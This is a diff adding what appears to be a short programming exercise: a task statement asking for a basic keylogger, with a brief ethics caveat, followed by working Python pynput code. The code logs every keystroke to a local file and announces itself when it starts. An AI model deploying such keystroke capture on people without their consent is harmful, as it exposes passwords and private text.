@@ -1,0 +1,26 @@
+Create a basic keylogger program that records and logs keystrokes. Focus on logging the keys pressed and saving them to a file. Note: Ethical considerations and permissions are crucial for projects involving keyloggers. 
+
+code:-(pip install pynput)
+
+from pynput import keyboard
+
+log_file = "key_log.txt"
+
+def on_press(key):
+    try:
+        with open(log_file, "a") as f:
+            f.write(f"{key.char}")
+    except AttributeError:
+        with open(log_file, "a") as f:
+            f.write(f" [{key}] ")
+
+def on_release(key):
+    if key == keyboard.Key.esc:
+        # Stop listener when 'Esc' is pressed
+        return False
+
+print("Keylogger started... Press ESC to stop.")
+
+with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
+    listener.join()
+
